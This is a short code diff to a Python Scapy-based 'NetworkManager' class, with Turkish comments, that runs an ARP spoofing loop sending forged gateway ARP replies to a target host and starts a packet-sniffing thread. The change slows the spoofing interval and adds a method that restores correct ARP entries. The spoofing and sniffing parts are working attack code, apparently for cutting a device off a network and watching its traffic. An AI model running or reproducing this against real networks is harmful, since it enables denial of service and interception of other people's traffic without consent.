@@ -122,7 +122,7 @@ class NetworkManager:
         packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
         while self.is_spoofing:
             send(packet, verbose=False)
-            time.sleep(2)
+            time.sleep(5)
 
     def start_disconnect(self, target_ip, gateway_ip, target_mac, log_cb):
         self.target_ip = target_ip
@@ -135,6 +135,15 @@ class NetworkManager:
         threading.Thread(target=self.spoof, args=(target_ip, gateway_ip, target_mac), daemon=True).start()
         # Paket Dinleme Thread (Canlı Log için)
         threading.Thread(target=self.start_sniffing, daemon=True).start()
+
+    def restore(self, target_ip, gateway_ip, target_mac, gateway_mac):
+        """Ağı eski haline döndürür (Düzeltme paketleri gönderir)."""
+        # op=2, psrc=kaynak ip, hwsrc=kaynak mac, pdst=hedef ip, hwdst=hedef mac
+        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
+        send(packet, count=4, verbose=False)
+        
+        packet_rev = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac)
+        send(packet_rev, count=4, verbose=False)
 
 
     def stop_disconnect(self):
